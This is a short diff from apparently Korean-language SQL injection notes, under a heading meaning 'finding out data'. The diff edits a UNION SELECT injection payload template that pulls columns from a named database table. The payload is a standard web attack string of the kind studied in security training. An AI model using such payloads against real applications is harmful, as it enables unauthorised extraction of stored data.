@@ -56,5 +56,5 @@
 # 데이터 알아내기
 
 ```
-' UNION SELECT 1, <column_name1>, <column_name2>, NULL FROM <database_name>.<table_name>-- -
+' UNION SELECT NULL, <column_name1>, <column_name2>, NULL FROM <database_name>.<table_name>-- -
 ```
